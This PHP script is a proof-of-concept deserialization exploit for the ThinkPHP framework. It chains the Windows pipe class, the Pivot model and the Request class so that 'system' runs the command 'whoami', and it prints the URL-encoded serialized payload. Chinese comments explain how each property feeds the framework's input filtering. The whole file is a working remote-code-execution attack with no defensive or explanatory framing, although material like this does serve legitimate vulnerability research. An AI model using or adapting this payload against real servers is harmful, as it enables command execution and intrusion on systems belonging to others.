<?php
namespace think\process\pipes{
    class Windows{
        public function __construct($s){
            $this->files = array($s);
        }
    }

}

namespace think\model\concern{
    trait Conversion{
        protected $append = array("key" => array('visible' => 'name_value'));
    }

    trait Attribute{
        private $data = []; 
        function __construct(){
            $this->data = array("key" => (new \think\Request())); //key 与上面$append那个key保持相同
        }
    }
}

namespace think{
    abstract class Model{
        use model\concern\Conversion;
        use model\concern\Attribute;
    }
    class Request{
        protected $hook = ["visible" => ["Request","isAjax"]];
        protected $filter = "system"; //filterValue()中的 filters数组
        protected $config = ['var_ajax' => '']; //input()中的 $name
        protected $param = ["whoami"]; //input()中的 $data
        function __construct(){
            $this->hook = ["visible"=>[$this,"isAjax"]];
        }
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{
    }

}

namespace{
    $string = new think\model\Pivot();
    $payload = new think\process\pipes\Windows($string);
    echo urlencode(serialize($payload));
}

